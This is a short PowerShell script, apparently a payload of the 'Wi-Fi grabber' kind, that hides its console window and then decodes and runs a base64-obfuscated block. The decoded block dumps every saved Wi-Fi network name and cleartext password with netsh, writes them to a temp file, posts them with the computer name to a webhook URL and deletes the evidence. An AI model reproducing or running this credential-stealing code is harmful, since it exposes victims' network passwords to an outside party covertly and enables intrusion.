$v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
$y = $v.Substring(0, 2)

if ($y -gt 21) {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle

    if ($hwnd -ne [System.IntPtr]::Zero) {
        $Type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }

    $s = "JHdodXJpID0gJGRjOyAkb3V0ZmlsZT0iIjskYT0wOyR3cz0obmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzKSAtcmVwbGFjZSAiLio6XHMrIjtmb3JlYWNoKCRzIGluICR3cyl7IGlmKCRhIC1ndCAxIC1BbmQgJHMgLU5vdE1hdGNoICIgcG9saWN5ICIgLUFuZCAkcyAtbmUgIlVzZXIgcHJvZmlsZXMiIC1BbmQgJHMgLU5vdE1hdGNoICItLS0tLSIgLUFuZCAkcyAtTm90TWF0Y2ggIjxOb25lPiIgLUFuZCAkcy5sZW5ndGggLWd0IDUpeyRzc2lkPSRzLlRyaW0oKTtpZigkcyAtTWF0Y2ggIjoiKXskc3NpZD0kcy5TcGxpdCgiOiIpWzFdLlRyaW0oKX0gJHB3PShuZXRzaCB3bGFuIHNob3cgcHJvZmlsZXMgbmFtZT0kc3NpZCBrZXk9Y2xlYXIpOyRwYXNzPSJOb25lIjtmb3JlYWNoKCRwIGluICRwdyl7aWYoJHAgLU1hdGNoICJLZXkgQ29udGVudCIpeyRwYXNzPSRwLlNwbGl0KCI6IilbMV0uVHJpbSgpOyRvdXRmaWxlKz0iU1NJRDogJHNzaWQgOiBQYXNzd29yZDogJHBhc3NgbiJ9fX0kYSsrO307ICRvdXRmaWxlIHwgT3V0LUZpbGUgLUZpbGVQYXRoICIkZW52OnRlbXBcaW5mby50eHQiIC1FbmNvZGluZyBBU0NJSSAtQXBwZW5kIDskUGF0aHN5cyA9ICIkZW52OnRlbXBcaW5mby50eHQiOyAkbXNnc3lzID0gR2V0LUNvbnRlbnQgLVBhdGggJFBhdGhzeXMgLVJhdyA7JGVzY21zZ3N5cyA9ICRtc2dzeXMgLXJlcGxhY2UgJ1smPD5dJywgeyRhcmdzWzBdLlZhbHVlLlJlcGxhY2UoJyYnLCAnJmFtcDsnKS5SZXBsYWNlKCc8JywgJyZsdDsnKS5SZXBsYWNlKCc+JywgJyZndDsnKX07ICRqc29uc3lzID0gQHsidXNlcm5hbWUiID0gIiRlbnY6Q09NUFVURVJOQU1FIiA7ImNvbnRlbnQiID0gJGVzY21zZ3N5c30gfCBDb252ZXJ0VG8tSnNvbiA7ClN0YXJ0LVNsZWVwIDEgOwpJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3aHVyaSAtTWV0aG9kIFBvc3QgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uIiAtQm9keSAkanNvbnN5cyA7ClJlbW92ZS1JdGVtIC1QYXRoICRQYXRoc3lzIC1mb3JjZQ=="
    $sd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
    iex $sd
}